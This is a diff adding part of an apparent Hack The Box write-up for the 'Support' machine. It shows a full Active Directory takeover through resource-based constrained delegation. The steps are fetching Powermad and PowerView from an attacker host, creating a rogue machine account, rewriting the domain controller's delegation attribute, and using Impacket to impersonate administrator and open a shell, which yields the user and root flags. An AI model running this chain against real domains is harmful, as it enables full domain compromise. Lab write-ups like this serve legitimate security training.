@@ -159,3 +159,83 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\support\Documents> 
 ```
+```console
+*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
+e5e4df8ff7b70b6d1b41b9893c2ec44c
+```
+
+```console
+*Evil-WinRM* PS C:\Users\support\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+```https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html```
+
+```console
+*Evil-WinRM* PS C:\temp> curl http://10.10.14.35:8000/Powermad/Powermad.ps1 -o Powermad.ps1
+*Evil-WinRM* PS C:\temp> import-module ./Powermad.ps1
+*Evil-WinRM* PS C:\temp> curl http://10.10.14.35:8000/powerview.ps1 -o powerview.ps1
+*Evil-WinRM* PS C:\temp> import-module ./powerview.ps1
+```
+
+```*Evil-WinRM* PS C:\temp> New-MachineAccount -MachineAccount rogue -Password $(ConvertTo-SecureString 'pass' -AsPlainText -Force) -Verbose
+Verbose: [+] Domain Controller = dc.support.htb
+Verbose: [+] Domain = support.htb
+Verbose: [+] SAMAccountName = rogue$
+Verbose: [+] Distinguished Name = CN=rogue,CN=Computers,DC=support,DC=htb
+[+] Machine account rogue added
+*Evil-WinRM* PS C:\temp> Get-DomainComputer rogue -Properties objectsid
+
+objectsid
+---------
+S-1-5-21-1677581083-3380853377-188903654-5603
+
+
+*Evil-WinRM* PS C:\temp> 
+```
+```console
+*Evil-WinRM* PS C:\temp> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5603)"
+*Evil-WinRM* PS C:\temp> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+*Evil-WinRM* PS C:\temp> $SD.GetBinaryForm($SDBytes, 0)
+*Evil-WinRM* PS C:\temp> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+
+```
+└──╼ [★]$ impacket-getST support.htb/rogue:pass -dc-ip 10.129.53.172 -impersonate administrator -spn www/dc.support.htb
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache
+```
+
+```
+└──╼ [★]$ export KRB5CCNAME=administrator.ccache
+─[us-dedivip-1]─[10.10.14.35]─[htb-0xrogue@pwnbox-base]─[~/my_data/HTB/Machines]
+└──╼ [★]$ impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+support\administrator
+```
+
+```
+C:\Users\Administrator\Desktop>type root.txt
+1a586ea32eb4efd6d2fd9f310f94e31c
+
+C:\Users\Administrator\Desktop>
+```
